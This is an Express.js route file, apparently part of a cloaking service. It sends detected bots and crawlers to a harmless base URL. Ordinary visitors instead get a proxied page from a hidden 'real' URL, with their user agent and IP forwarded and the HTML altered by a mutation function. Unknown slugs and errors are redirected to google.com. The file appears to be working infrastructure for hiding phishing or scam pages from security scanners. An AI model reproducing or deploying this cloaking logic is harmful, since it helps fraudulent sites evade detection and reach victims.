const express = require('express');
const axios = require('axios');
const { isBot } = require('../utils/botDetection');
const Domain = require('../models/Domain');
const { mutateHTMLSafe } = require('../utils/mutator');

const router = express.Router();

router.get('/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    const ua = req.headers['user-agent'] || '';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const domain = await Domain.findOne({ slug });
    if (!domain) return res.redirect('https://google.com');

    // Bot detection
    if (isBot(ua, ip)) {
      return res.redirect(domain.baseUrl);
    }

    const proxyUrl = domain.realUrl + req.originalUrl;
    const headers = {
      'User-Agent': ua,
      'X-Forwarded-For': ip,
      Referer: req.get('referer') || '',
    };

    const response = await axios.get(proxyUrl, { headers });
    const html = mutateHTMLSafe(response.data);

    return res.send(html);
  } catch (err) {
    console.error("Erro no render:", err);
    return res.redirect('https://google.com');
  }
});

module.exports = router;
